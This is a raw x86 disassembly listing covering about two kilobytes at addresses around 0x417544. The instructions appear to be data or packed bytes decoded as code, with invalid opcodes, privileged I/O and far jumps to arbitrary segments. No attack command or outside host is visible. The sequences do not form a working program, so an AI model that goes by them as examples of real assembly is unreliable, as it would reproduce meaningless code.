  417544:	rol    BYTE PTR [edx],0x72
  417547:	dec    esp
  417548:	arpl   WORD PTR [eax+0x18de5e87],si
  41754e:	pop    es
  41754f:	ret    0x1cde
  417552:	neg    BYTE PTR [edi+0x52]
  417555:	push   ebp
  417556:	retf   0x955
  417559:	xlat   BYTE PTR ds:[ebx]
  41755b:	les    edx,FWORD PTR [edx]
  41755d:	repnz popf 
  41755f:	adc    al,ah
  417561:	icebp  
  417562:	inc    eax
  417563:	mov    cs,WORD PTR [ebx+0x2a]
  417566:	cmp    al,0x35
  417568:	jge    0xea1fc2b7
  41756e:	ins    BYTE PTR es:[edi],dx
  41756f:	xchg   ebp,eax
  417570:	mov    eax,ds:0x7add3d6c
  417575:	das    
  417576:	and    eax,0xaad9b84b
  41757b:	mov    edi,0xdc8ce969
  417580:	imul   edi,DWORD PTR [ebx+edx*1],0xffffff8f
  417584:	loopne 0x417569
  417586:	sbb    dl,ch
  417588:	mov    bh,0x6c
  41758a:	push   ds
  41758b:	cmp    BYTE PTR [esi-0x11],ah
  41758e:	aaa    
  41758f:	mov    eax,0x1fd039d6
  417594:	sbb    eax,ebx
  417596:	sub    ah,BYTE PTR [ecx]
  417598:	int3   
  417599:	or     ecx,DWORD PTR [eax-0x11]
  41759c:	ror    DWORD PTR [eax-0x7a5f724d],cl
  4175a2:	in     eax,dx
  4175a3:	es data16 jge 0x417530
  4175a7:	bound  esi,QWORD PTR [edx-0x3]
  4175aa:	imul   DWORD PTR [edx+0x21]
  4175ad:	pop    ebx
  4175ae:	inc    eax
  4175af:	xchg   edx,eax
  4175b0:	shl    DWORD PTR [edx],1
  4175b2:	daa    
  4175b3:	mov    eax,ds:0xb75e8651
  4175b8:	popa   
  4175b9:	sub    BYTE PTR [eax+0x73ebe4f4],cl
  4175bf:	and    DWORD PTR [eax+ebx*4],ebp
  4175c2:	xor    DWORD PTR [ebx+0x6a],0x7
  4175c6:	shr    DWORD PTR [ebp+0x3b536b44],0xaf
  4175cd:	cmp    ebp,eax
  4175cf:	cmp    bh,BYTE PTR [esp+eax*2+0x3d]
  4175d3:	jne    0x41758d
  4175d5:	xor    DWORD PTR [edi],ecx
  4175d7:	adc    ecx,DWORD PTR [bx+si]
  4175da:	xchg   edx,eax
  4175db:	adc    eax,0x80be2035
  4175e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175e1:	add    dh,BYTE PTR [ebp-0x4a]
  4175e4:	call   0xd22d:0xdd117db9
  4175eb:	arpl   WORD PTR [eax-0x5b2a3197],bp
  4175f1:	int3   
  4175f2:	xor    BYTE PTR [edx],al
  4175f4:	dec    edi
  4175f5:	dec    ecx
  4175f6:	jg     0x4175ce
  4175f8:	xchg   edx,eax
  4175f9:	ja     0x417641
  4175fb:	bound  ebx,QWORD PTR [ebp-0x52]
  4175fe:	mov    edx,0xa1b1a669
  417603:	add    eax,0xffffffda
  417606:	leave  
  417607:	push   cs
  417608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417609:	xlat   BYTE PTR ds:[ebx]
  41760a:	mov    ebx,0x680a12cd
  41760f:	call   0x308e21fa
  417614:	jno    0x41765d
  417616:	and    BYTE PTR ds:0xd79d8255,al
  41761c:	outs   dx,DWORD PTR ds:[esi]
  41761d:	test   DWORD PTR [ebp-0x49],edx
  417620:	push   esp
  417621:	jmp    0x9f6c6a9d
  417626:	sub    bp,WORD PTR [edi+0x36fec1e7]
  41762d:	jno    0x417697
  41762f:	mov    cl,0x32
  417631:	xchg   edx,edi
  417633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417634:	xchg   esp,eax
  417635:	push   ecx
  417636:	pop    ds
  417637:	cmp    BYTE PTR [edi-0x6c8b0be3],ch
  41763d:	inc    ecx
  41763e:	pop    ecx
  41763f:	jecxz  0x4175ca
  417641:	lods   eax,DWORD PTR ds:[esi]
  417642:	push   eax
  417643:	call   0x805b:0xdfdc39a
  41764a:	hlt    
  41764b:	pop    edx
  41764c:	out    0x66,eax
  41764e:	imul   eax,DWORD PTR [eax+ebx*4-0x6e4f60e5],0xd337616f
  417659:	scas   eax,DWORD PTR es:[edi]
  41765a:	fdivr  st(6),st
  41765c:	mov    cl,0x1f
  41765e:	retf   
  41765f:	sub    BYTE PTR [ecx+0x72],0x72
  417663:	push   0x62
  417665:	push   edx
  417666:	ss jbe 0x417666
  417669:	sbb    dl,BYTE PTR [eax+eiz*4+0x43]
  41766d:	jmp    0x41bdb85a
  417672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417673:	rol    DWORD PTR [esi-0x6e],cl
  417676:	repz mov dh,0x27
  417679:	nop
  41767a:	scas   eax,DWORD PTR es:[edi]
  41767b:	cdq    
  41767c:	(bad)  
  41767d:	push   0xffffffbe
  41767f:	loope  0x417601
  417681:	add    ah,ch
  417683:	push   ds
  417684:	test   eax,0xc7808180
  417689:	loope  0x4176a5
  41768b:	(bad)  
  41768c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41768d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41768e:	inc    esp
  41768f:	jne    0x4176a9
  417691:	shl    edx,1
  417693:	fs push ecx
  417695:	push   0x55
  417697:	mov    es,WORD PTR [edx-0x218e1bfc]
  41769d:	cmp    ah,ah
  41769f:	inc    eax
  4176a0:	je     0x417671
  4176a2:	add    DWORD PTR [esp+edi*4-0x1ebcaf4d],ebp
  4176a9:	js     0x417658
  4176ab:	test   eax,0x78d9083e
  4176b0:	nop
  4176b1:	and    BYTE PTR ss:[ebp+0x1d],ch
  4176b5:	adc    DWORD PTR [ecx],0xffffffd9
  4176b8:	idiv   BYTE PTR [eax]
  4176ba:	jo     0x417712
  4176bc:	out    dx,eax
  4176bd:	sub    ebx,0xffffffdb
  4176c0:	std    
  4176c1:	xchg   edx,eax
  4176c2:	xchg   ebp,eax
  4176c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176c4:	out    0xdb,eax
  4176c6:	test   al,0xf2
  4176c8:	sti    
  4176c9:	lock push 0xffffffb8
  4176cc:	scas   eax,DWORD PTR es:[edi]
  4176cd:	setbe  BYTE PTR [ebx+0x2568d48e]
  4176d4:	out    dx,al
  4176d5:	inc    ebp
  4176d6:	ficomp DWORD PTR [esi]
  4176d8:	adc    BYTE PTR [ebp+0x6f],dh
  4176db:	je     0x41766a
  4176dd:	sub    DWORD PTR [edi+0x10bb9be4],edi
  4176e3:	mov    ah,0xae
  4176e5:	lods   al,BYTE PTR cs:[esi]
  4176e7:	jge    0x417702
  4176e9:	mov    BYTE PTR [edx+esi*8],cl
  4176ec:	aad    0x97
  4176ee:	mov    ebp,0x82c6efe0
  4176f3:	sbb    bl,BYTE PTR [edx+0x67634f8f]
  4176f9:	add    bh,dh
  4176fb:	je     0x417684
  4176fd:	xor    DWORD PTR [esi+0x44385792],0x1b
  417704:	stc    
  417705:	mov    eax,ds:0x94feadbd
  41770a:	add    dh,BYTE PTR [esi]
  41770c:	ds pop ss
  41770e:	shl    ecx,cl
  417710:	push   ebx
  417711:	mov    eax,0x53bddd45
  417716:	xor    cl,BYTE PTR [ebp+0x1]
  417719:	xor    al,0xbc
  41771b:	mov    dh,0x94
  41771d:	sub    al,0x77
  41771f:	sti    
  417720:	or     esp,ebx
  417722:	es sbb al,0x40
  417725:	pop    ds
  417726:	in     al,0x70
  417728:	sub    ch,ch
  41772a:	dec    ecx
  41772b:	adc    al,0x62
  41772d:	jno    0x4176d4
  41772f:	xchg   esp,eax
  417730:	adc    al,0x97
  417732:	mov    dl,0x15
  417734:	(bad)  
  417735:	shl    DWORD PTR [eax],cl
  417737:	dec    ecx
  417738:	push   cs
  417739:	rcr    ah,cl
  41773b:	lock push 0x7d
  41773e:	push   0xc56977ee
  417743:	mov    WORD PTR [ebp-0x2b],?
  417746:	mov    dl,0xe8
  417748:	xor    ebp,0x42c356c3
  41774e:	rcr    BYTE PTR [edi-0x75],0xa5
  417752:	stos   DWORD PTR es:[edi],eax
  417753:	xor    BYTE PTR [esi],dl
  417755:	enter  0xe699,0x1d
  417759:	fiadd  WORD PTR [esi+0x788443d6]
  41775f:	add    DWORD PTR ds:0xbbd96f6f,ecx
  417765:	add    ch,BYTE PTR [edx-0x46783081]
  41776b:	fnsetpm(287 only) 
  41776d:	jmp    0x4177c5
  41776f:	fadd   DWORD PTR [ecx-0x26]
  417772:	and    bh,BYTE PTR [ebp+0x39042df]
  417778:	mov    BYTE PTR [edi-0x48d828a6],cl
  41777e:	lods   al,BYTE PTR ds:[esi]
  41777f:	inc    edx
  417780:	push   esi
  417781:	ins    BYTE PTR es:[edi],dx
  417782:	(bad)  [ebx-0x16]
  417785:	add    DWORD PTR [eax-0x36],ecx
  417788:	iret   
  417789:	in     eax,dx
  41778a:	jnp    0x4177b9
  41778c:	mov    dl,0x12
  41778e:	rcl    BYTE PTR [esi],0xc8
  417791:	gs xor al,0xc6
  417794:	jnp    0x417733
  417796:	scas   al,BYTE PTR es:[edi]
  417797:	push   ss
  417798:	pusha  
  417799:	add    ebp,0x4f05735
  41779f:	call   0x5c5e9a87
  4177a4:	lods   eax,DWORD PTR ds:[esi]
  4177a5:	fwait
  4177a6:	xor    ch,BYTE PTR [esi]
  4177a8:	dec    DWORD PTR [ebp+0x57b8a92c]
  4177ae:	and    ecx,eax
  4177b0:	lods   eax,DWORD PTR ds:[esi]
  4177b1:	out    dx,al
  4177b2:	cld    
  4177b3:	sub    al,0x57
  4177b5:	mov    cl,0x4
  4177b7:	push   es
  4177b8:	shl    cl,cl
  4177ba:	mov    al,ds:0xe0c4c1a7
  4177bf:	sti    
  4177c0:	icebp  
  4177c1:	retf   0xf7f6
  4177c4:	(bad)
  4177c8:	inc    ebx
  4177c9:	push   ebx
  4177ca:	std    
  4177cb:	je     0x417828
  4177cd:	imul   ebx,ecx,0xa855f95c
  4177d3:	scas   eax,DWORD PTR es:[edi]
  4177d4:	sbb    esp,ecx
  4177d6:	in     eax,dx
  4177d7:	sti    
  4177d8:	call   0x8cd98157
  4177dd:	add    ah,ah
  4177df:	add    BYTE PTR [edi+0x4c],dl
  4177e2:	jge    0x417772
  4177e4:	(bad)  
  4177e5:	push   esi
  4177e6:	fst    st(0)
  4177e8:	(bad)  
  4177e9:	cmp    eax,0x443ecd1f
  4177ee:	rcl    DWORD PTR [ebp+0x62],0xe7
  4177f2:	popa   
  4177f3:	mov    ebx,0x434b4d4c
  4177f8:	fmul   QWORD PTR [edi-0x21]
  4177fb:	mov    bh,0x56
  4177fd:	arpl   WORD PTR [edx+0x657b663a],si
  417803:	push   esi
  417804:	lahf   
  417805:	cmp    ebx,DWORD PTR [edi+0x6a]
  417808:	call   0xddd62c8d
  41780d:	sub    DWORD PTR [ebp+edi*8+0x3292413f],0x3a
  417815:	fsubrp st(1),st
  417817:	iret   
  417818:	dec    ebx
  417819:	test   al,0x6c
  41781b:	(bad)  
  41781c:	leave  
  41781d:	mov    edx,0xbac64fbb
  417822:	sbb    edi,edi
  417824:	lahf   
  417825:	inc    ecx
  417826:	sub    esp,esi
  417828:	sub    BYTE PTR [esi+esi*4-0x6ca7a4d0],cl
  41782f:	ins    BYTE PTR es:[edi],dx
  417830:	outs   dx,DWORD PTR ds:[esi]
  417831:	xor    DWORD PTR [ebx*8-0x22ee28ae],eax
  417838:	mov    ecx,0x205586a0
  41783d:	dec    ebx
  41783e:	sbb    eax,0x31cc6b8b
  417843:	pop    ebx
  417844:	pushf  
  417845:	div    ebx
  417847:	dec    edx
  417848:	xor    ecx,DWORD PTR [edi+0x31]
  41784b:	adc    bh,BYTE PTR cs:[edx+0x5f20397e]
  417852:	scas   al,BYTE PTR es:[edi]
  417853:	mov    ah,0xa
  417855:	or     DWORD PTR [edx+0x7b],ecx
  417858:	test   bh,dh
  41785a:	(bad)  
  41785c:	ins    BYTE PTR es:[edi],dx
  41785d:	outs   dx,DWORD PTR ds:[esi]
  41785e:	pop    ecx
  41785f:	xchg   ecx,eax
  417860:	add    DWORD PTR [edi+0xa94313b],edx
  417866:	addr16 push ecx
  417868:	call   0xc7cb397b
  41786d:	and    esp,eax
  41786f:	jns    0x417820
  417871:	loope  0x417820
  417873:	cld    
  417874:	(bad)  
  417875:	mov    al,0xc4
  417877:	dec    ecx
  417878:	lds    edx,FWORD PTR [ecx]
  41787a:	in     al,dx
  41787b:	and    ecx,DWORD PTR [ebp-0x63793df9]
  417881:	pushf  
  417882:	ins    DWORD PTR es:[edi],dx
  417883:	jp     0x417883
  417885:	push   cs
  417886:	rcl    DWORD PTR [edi-0x5a057ca7],cl
  41788c:	dec    esp
  41788d:	stos   DWORD PTR es:[edi],eax
  41788e:	push   esi
  41788f:	(bad)  
  417890:	rol    BYTE PTR [esi-0x1242fadd],0x32
  417897:	retf   0xe06
  41789a:	(bad)  
  41789b:	push   edi
  41789c:	mov    esi,0xfe6dbe53
  4178a1:	push   esi
  4178a2:	mov    ds:0x3376fdf7,eax
  4178a7:	jmp    0xdc46:0x57524e97
  4178ae:	push   cs
  4178af:	pop    es
  4178b0:	imul   eax,DWORD PTR [ebx-0x484a9eb3],0xbf6a54a1
  4178ba:	jp     0x417857
  4178bc:	adc    BYTE PTR [ecx-0x3581769e],0xd0
  4178c3:	jns    0x417849
  4178c5:	mov    bl,0x26
  4178c7:	mov    dl,0x96
  4178c9:	push   ebp
  4178ca:	xchg   DWORD PTR [edx],esi
  4178cc:	int    0x3a
  4178ce:	imul   esi,DWORD PTR [ecx+0x64d0f65b],0xc3839944
  4178d8:	xor    eax,0x70422369
  4178dd:	call   FWORD PTR [ecx+ecx*2]
  4178e0:	inc    eax
  4178e1:	xchg   esi,eax
  4178e2:	jecxz  0x4178ee
  4178e4:	dec    ebx
  4178e5:	or     DWORD PTR [eax+0x1b],ebx
  4178e8:	jmp    0x417968
  4178ea:	jle    0x41787b
  4178ec:	jbe    0x4178d0
  4178ee:	ins    BYTE PTR es:[edi],dx
  4178ef:	pop    ebx
  4178f0:	(bad)  
  4178f1:	xlat   BYTE PTR ds:[ebx]
  4178f2:	(bad)  
  4178f3:	xchg   esp,eax
  4178f4:	xor    ebp,DWORD PTR [esi]
  4178f6:	jns    0x417940
  4178f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178f9:	in     eax,0x9d
  4178fb:	pop    cx
  4178fd:	adc    ebx,eax
  4178ff:	mov    ebx,0xd44bf2b4
  417904:	add    ebp,DWORD PTR ds:0xdac0ba36
  41790a:	sar    bl,1
  41790c:	cmp    DWORD PTR [ecx+0x74],edx
  41790f:	sbb    dh,cl
  417911:	sub    DWORD PTR [edx],ebx
  417913:	ins    DWORD PTR es:[edi],dx
  417914:	cmc    
  417915:	or     al,0x0
  417917:	push   edx
  417918:	retf   
  417919:	mov    al,ds:0xcf2b5670
  41791e:	retf   
  41791f:	movntq QWORD PTR [esi],mm0
  417922:	loope  0x417940
  417924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417925:	mov    ecx,0x92f2b56c
  41792a:	repnz mov al,ds:0xb3d5b2f1
  417930:	dec    edi
  417931:	push   0xffffffc9
  417933:	dec    edi
  417934:	xor    ch,al
  417936:	je     0x417965
  417938:	lock lods eax,DWORD PTR ds:[esi]
  41793a:	cmp    BYTE PTR [eax-0x5c3903dd],0xc6
  417941:	mov    ds:0xae8ac3fe,eax
  417946:	jmp    0x417941
  417948:	push   ebx
  417949:	call   0x3a73:0xca342218
  417950:	les    esi,FWORD PTR [eax-0x58cb5179]
  417956:	repz and BYTE PTR [esi],dh
  417959:	retf   
  41795a:	sbb    eax,0xd95ca3bc
  41795f:	inc    edi
  417960:	(bad)  
  417961:	loopne 0x41791a
  417963:	mov    bl,0x5
  417965:	jns    0x4179a7
  417967:	cmp    cl,cl
  417969:	sub    al,bl
  41796b:	or     eax,0x7462a788
  417970:	int3   
  417971:	mov    ah,0x3c
  417973:	ror    BYTE PTR [edx+0xb],cl
  417976:	jmp    DWORD PTR [edx]
  417978:	das    
  417979:	ror    DWORD PTR [esi],1
  41797b:	leave  
  41797c:	sbb    al,0x5f
  41797e:	sbb    ecx,DWORD PTR [esi-0x53c608b1]
  417984:	xor    al,dl
  417986:	add    al,0xc4
  417988:	mov    ebx,0x47453b8a
  41798d:	dec    DWORD PTR [ecx+0x27c5a1cb]
  417993:	(bad)  
  417994:	idiv   BYTE PTR [ebx+0x6bfef152]
  41799a:	mov    ecx,0x31b61562
  41799f:	pushf  
  4179a0:	mov    al,0x10
  4179a2:	test   ecx,0xfc79bc64
  4179a8:	mov    ebp,0xeb12f051
  4179ad:	pop    edi
  4179ae:	pop    esp
  4179af:	dec    edx
  4179b0:	xchg   esi,eax
  4179b1:	sbb    al,0x94
  4179b3:	sahf   
  4179b4:	push   cs
  4179b5:	cmp    BYTE PTR [esi+0x73],cl
  4179b8:	xor    ebp,DWORD PTR [ebp-0x71]
  4179bb:	mov    edi,0x8ae074e8
  4179c0:	mov    ds:0xa70bbb01,eax
  4179c5:	dec    eax
  4179c6:	aas    
  4179c7:	pusha  
  4179c8:	cmp    DWORD PTR [ebx],eax
  4179ca:	or     DWORD PTR [ebx-0x69117596],ecx
  4179d0:	adc    BYTE PTR [ecx-0x51],dl
  4179d3:	adc    BYTE PTR [ebx],al
  4179d5:	in     al,dx
  4179d6:	ret    
  4179d7:	cmc    
  4179d8:	mov    bh,0x95
  4179da:	daa    
  4179db:	push   edi
  4179dc:	jge    0x41798a
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	pop    ecx
  4179e0:	pop    edx
  4179e1:	fstp   TBYTE PTR [ebx+eiz*1-0x2dda517e]
  4179e8:	fwait
  4179e9:	clc    
  4179ea:	pop    edx
  4179eb:	pop    edi
  4179ec:	sbb    DWORD PTR [eax+0x3593a7b2],edx
  4179f2:	pop    ss
  4179f3:	dec    esp
  4179f4:	cmp    BYTE PTR [ebp-0x7],dh
  4179f7:	outs   dx,DWORD PTR ds:[esi]
  4179f8:	inc    esp
  4179f9:	cmp    BYTE PTR [edi+esi*1+0x629c2386],cl
  417a00:	in     al,0x8e
  417a02:	inc    ecx
  417a03:	ffreep st(7)
  417a05:	cmp    BYTE PTR [edx+0x64],ah
  417a08:	inc    ebp
  417a09:	jns    0x417a2d
  417a0b:	mov    ecx,DWORD PTR [esp+ebp*1]
  417a0e:	lock fldcw WORD PTR [esi+0x131cc382]
  417a15:	jge    0x4179f1
  417a17:	mov    dh,0xcd
  417a19:	xchg   esi,eax
  417a1a:	pop    ss
  417a1b:	fdivr  st,st(4)
  417a1d:	hlt    
  417a1e:	cld    
  417a1f:	aam    0x2f
  417a21:	inc    edi
  417a22:	or     eax,0xcd858660
  417a27:	lock arpl WORD PTR [ecx+0x31572a13],si
  417a2e:	inc    edx
  417a2f:	in     eax,dx
  417a30:	inc    ecx
  417a31:	aaa    
  417a32:	mov    al,ds:0x73bac2ec
  417a37:	xor    al,0xdd
  417a39:	jp     0x417a8f
  417a3b:	loopne 0x417ab5
  417a3d:	outs   dx,DWORD PTR ds:[esi]
  417a3e:	jge    0x4179d1
  417a40:	and    bh,BYTE PTR [esi-0x75]
  417a43:	inc    eax
  417a44:	ret    
  417a45:	jmp    0x4179e1
  417a47:	lea    ebp,[eax]
  417a49:	or     DWORD PTR [eax-0x71f3d5bb],ebx
  417a4f:	in     eax,dx
  417a50:	aam    0x53
  417a52:	push   esp
  417a53:	aam    0x84
  417a55:	jo     0x4179de
  417a57:	ror    BYTE PTR [ebp+0x57fbc5e8],cl
  417a5d:	add    BYTE PTR [eax+0x6c3a8d90],ah
  417a63:	push   edx
  417a64:	mov    ss,WORD PTR ds:0x389df4f
  417a6a:	loop   0x417a14
  417a6c:	inc    esp
  417a6d:	stc    
  417a6e:	dec    eax
  417a6f:	repnz pop ds
  417a71:	(bad)  
  417a72:	aad    0x82
  417a74:	shl    DWORD PTR [ecx+ebp*2-0x5c],0xc6
  417a79:	fwait
  417a7a:	xor    esi,eax
  417a7c:	mov    esp,0x423a04e0
  417a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a82:	jae    0x417ae2
  417a84:	call   0x29e9cd6e
  417a89:	jnp    0x417a59
  417a8b:	test   eax,0xc1850b1f
  417a90:	push   cs
  417a91:	rcr    DWORD PTR [edi-0x5b],1
  417a94:	adc    al,0x3e
  417a96:	jmp    0x20ba:0x639c9329
  417a9d:	sbb    eax,ebx
  417a9f:	or     ebx,DWORD PTR [ebx]
  417aa1:	adc    al,0xc6
  417aa3:	shl    DWORD PTR [eax+0x7d],1
  417aa6:	sbb    DWORD PTR [ebx],eax
  417aa8:	jne    0x417af3
  417aaa:	xchg   esi,eax
  417aab:	cmp    edx,esi
  417aad:	call   0xaf8699c8
  417ab2:	jb     0x417ae8
  417ab4:	mov    ch,0x56
  417ab6:	push   edi
  417ab7:	cmp    eax,ebx
  417ab9:	push   cs
  417aba:	mov    ebx,0x21ebca78
  417abf:	in     eax,0xa0
  417ac1:	mov    edi,0xc3783bbd
  417ac6:	es jnp 0x417a5e
  417ac9:	enter  0xf8ee,0xe5
  417acd:	icebp  
  417ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417acf:	(bad)
  417ad2:	and    DWORD PTR [ecx-0x5b34dafe],esp
  417ad8:	add    BYTE PTR [esi+0x1f],dh
  417adb:	cmp    bh,BYTE PTR [eax+0x7]
  417ade:	stos   DWORD PTR es:[edi],eax
  417adf:	dec    esp
  417ae0:	adc    al,0x14
  417ae2:	aaa    
  417ae3:	and    al,0x6b
  417ae5:	cmp    DWORD PTR [esi],eax
  417ae7:	mov    es,WORD PTR [edx+0x45]
  417aea:	test   eax,0x78750708
  417aef:	xchg   esp,eax
  417af0:	sbb    BYTE PTR [ebx],bl
  417af2:	sub    DWORD PTR [eax],edx
  417af4:	xlat   BYTE PTR ds:[ebx]
  417af5:	outs   dx,BYTE PTR ds:[esi]
  417af6:	icebp  
  417af7:	push   cs
  417af8:	cmp    al,bl
  417afa:	jns    0x417b29
  417afc:	jb     0x417ae9
  417afe:	jnp    0x417b44
  417b00:	sti    
  417b01:	gs mov dh,0x70
  417b04:	hlt    
  417b05:	mov    ds:0x5f1b145,al
  417b0a:	loope  0x417b55
  417b0c:	mov    edx,0xf0b7aeff
  417b11:	push   ecx
  417b12:	mov    BYTE PTR [eax+0x1fb0399d],0x68
  417b19:	popf   
  417b1a:	scas   al,BYTE PTR es:[edi]
  417b1b:	popa   
  417b1c:	mov    al,0x3a
  417b1e:	loop   0x417ae5
  417b20:	jmp    0x378a:0xda785a82
  417b27:	(bad)  
  417b28:	gs or  ah,dh
  417b2b:	xchg   edi,eax
  417b2c:	pop    esi
  417b2d:	repz sub eax,0x731494c4
  417b33:	mov    ebx,0x6972838b
  417b38:	js     0x417afa
  417b3a:	js     0x417acc
  417b3c:	sar    BYTE PTR [edx-0x48],cl
  417b3f:	inc    esp
  417b40:	xchg   edx,eax
  417b41:	gs mov esp,0xae466dd6
  417b47:	jge    0x417b70
  417b49:	jns    0x417b6a
  417b4b:	scas   eax,DWORD PTR es:[edi]
  417b4c:	mov    bl,0xcb
  417b4e:	lods   eax,DWORD PTR ds:[esi]
  417b4f:	cmp    bh,BYTE PTR [edx+eax*8]
  417b52:	lea    esp,[edx+eax*8]
  417b55:	jge    0x417b7b
  417b57:	adc    al,0x16
  417b59:	dec    eax
  417b5a:	and    eax,0xbfe6a4a0
  417b5f:	lock ret 
  417b61:	pop    ebx
  417b62:	sub    cl,BYTE PTR [ecx]
  417b64:	dec    ecx
  417b65:	mov    ds:0xce19000,al
  417b6a:	sub    al,0x41
  417b6c:	jno    0x417b3e
  417b6e:	inc    esp
  417b6f:	xchg   ebx,eax
  417b70:	out    dx,eax
  417b71:	aas    
  417b72:	call   0xfc14:0xade20d06
  417b79:	push   es
  417b7a:	jmp    0x4c527887
  417b7f:	and    dh,dh
  417b81:	sbb    al,0x8e
  417b83:	test   DWORD PTR [edi],ebx
  417b85:	sub    ecx,DWORD PTR ds:0x8145592a
  417b8b:	sbb    BYTE PTR [edi+0x5bb82a96],0x21
  417b92:	and    bh,cl
  417b94:	popf   
  417b95:	xor    eax,0x9460f7b3
  417b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b9b:	dec    edx
  417b9c:	mov    esp,0x771a004d
  417ba1:	jne    0x417bf0
  417ba3:	addr16 and eax,0xa19a0cea
  417ba9:	sbb    al,0x7
  417bab:	sub    ah,al
  417bad:	imul   esp,DWORD PTR [esi],0xb6d22f7c
  417bb3:	test   DWORD PTR [eax-0x21321928],eax
  417bb9:	xor    BYTE PTR [edx+edx*1-0x279a12f5],dh
  417bc0:	xor    BYTE PTR [eax],bh
  417bc2:	add    ah,BYTE PTR ds:0xdc93a9fb
  417bc8:	sbb    DWORD PTR [edx],ecx
  417bca:	loop   0x417b72
  417bcc:	dec    ecx
  417bcd:	inc    ecx
  417bce:	sti    
  417bcf:	ins    DWORD PTR es:[edi],dx
  417bd0:	ja     0x417b6f
  417bd2:	in     eax,0xf4
  417bd4:	adc    BYTE PTR [esi+0x58],bh
  417bd7:	add    BYTE PTR [esi-0x1d],dh
  417bda:	fwait
  417bdb:	(bad)  
  417bdc:	shr    BYTE PTR [ebp-0x404c527e],0xcf
  417be3:	xor    eax,0x88f7e2b7
  417be8:	xchg   DWORD PTR [edx-0x79c00629],ecx
  417bee:	repz sbb DWORD PTR [edx],ebx
  417bf1:	(bad)  
  417bf2:	cs push 0xffffff95
  417bf5:	sbb    edi,DWORD PTR [ebp-0x17e8b191]
  417bfb:	xor    dh,dh
  417bfd:	popa   
  417bfe:	and    al,0xc8
  417c00:	jb     0x417c5c
  417c02:	xchg   ecx,eax
  417c03:	sub    BYTE PTR [edx-0x53ad686d],0x3a
  417c0a:	test   al,0xc7
  417c0c:	push   ecx
  417c0d:	mov    dl,0x21
  417c0f:	pusha  
  417c10:	xor    BYTE PTR [ecx-0x1c],bl
  417c13:	adc    eax,0x102eb7d1
  417c18:	daa    
  417c19:	rcr    BYTE PTR [esi+0x1],0x69
  417c1d:	sbb    al,bh
  417c1f:	dec    ebx
  417c20:	mov    al,0xc7
  417c22:	pop    ecx
  417c23:	scas   al,BYTE PTR es:[edi]
  417c24:	in     al,0xd
  417c26:	mov    edx,0x5f5f99e5
  417c2b:	push   ss
  417c2c:	retf   0xd820
  417c2f:	lock sub eax,0xd0ad4978
  417c35:	pop    edi
  417c36:	out    0xdb,eax
  417c38:	sar    BYTE PTR [edx+0x1],cl
  417c3b:	leave  
  417c3c:	arpl   WORD PTR [esi-0x8aa5a40],bp
  417c42:	inc    esi
  417c43:	call   0x9ba9:0x7a818fcc
  417c4a:	pop    ss
  417c4b:	mov    dl,0x6a
  417c4d:	xor    bl,BYTE PTR [eax+0x22e6aa28]
  417c53:	mov    al,ds:0x624407a5
  417c58:	retf   0x6698
  417c5b:	loop   0x417c1f
  417c5d:	pop    edi
  417c5e:	sbb    bl,BYTE PTR [esi+0x477e906b]
  417c64:	fucomi st,st(2)
  417c66:	cmp    ebx,DWORD PTR [edx-0xf]
  417c69:	cmp    al,0x71
  417c6b:	mov    ecx,0x6b752a6e
  417c70:	jno    0x417c9d
  417c72:	inc    esp
  417c73:	add    DWORD PTR [esi],ebx
  417c75:	dec    esi
  417c76:	cwde   
  417c77:	inc    esp
  417c78:	mov    ds:0xa3c23e84,eax
  417c7d:	rcr    DWORD PTR [ebx],0x9c
  417c80:	jmp    0x417cff
  417c82:	inc    eax
  417c83:	jl     0x417c7b
  417c85:	icebp  
  417c86:	mov    edi,0x971a389b
  417c8b:	enter  0x4350,0xd8
  417c8f:	fnstcw WORD PTR [ecx-0x28]
  417c92:	dec    ebp
  417c93:	push   ebp
  417c94:	mov    ch,0x6
  417c96:	outs   dx,BYTE PTR ds:[esi]
  417c97:	mov    eax,ds:0xd5c64023
  417c9c:	stos   DWORD PTR es:[edi],eax
  417c9d:	ja     0x417ca8
  417c9f:	jo     0x417cd2
  417ca1:	mov    al,0x7
  417ca3:	out    dx,eax
  417ca4:	dec    edi
  417ca5:	ret    
  417ca6:	popa   
  417ca7:	jns    0x417cab
  417ca9:	test   eax,0x4c7da491
  417cae:	push   es
  417caf:	mov    BYTE PTR [ebx],0x2d
  417cb2:	jnp    0x417c5f
  417cb4:	js     0x417c5b
  417cb6:	ins    BYTE PTR es:[edi],dx
  417cb7:	push   edx
  417cb8:	jo     0x417cef
  417cba:	add    DWORD PTR [esi+0x3],eax
  417cbd:	xlat   BYTE PTR ds:[ebx]
  417cbe:	mov    ds:0x28188f5e,eax
  417cc3:	nop
  417cc4:	mul    DWORD PTR [edx]
  417cc6:	adc    ebp,DWORD PTR [edx-0xe]
  417cc9:	and    DWORD PTR [edx],edi
  417ccb:	xchg   edi,eax
  417ccc:	push   ecx
  417ccd:	mov    eax,0x7be743a7
  417cd2:	add    BYTE PTR [ebp+0x70],al
  417cd5:	add    DWORD PTR [edx-0x3a],ecx
  417cd8:	xchg   esp,eax
  417cd9:	fst    QWORD PTR fs:[ebp-0x6ec299f0]
  417ce0:	test   al,0xe6
  417ce2:	rcr    DWORD PTR [ebp-0x26],0x94
  417ce6:	jmp    0xdbb175c5
  417ceb:	js     0x417d43
  417ced:	test   al,0x53
  417cef:	mov    ebx,0x73f214e6
  417cf4:	repz xchg esi,eax
  417cf6:	jg     0x417d59
  417cf8:	popf   
  417cf9:	rcl    DWORD PTR [edi-0x6c934c3f],0x19
  417d00:	inc    ebx
  417d01:	inc    ebx
  417d02:	mov    BYTE PTR [esi+0x7],al
  417d05:	int    0x2
  417d07:	hlt    
  417d08:	dec    ebx
  417d09:	xor    esi,ebx
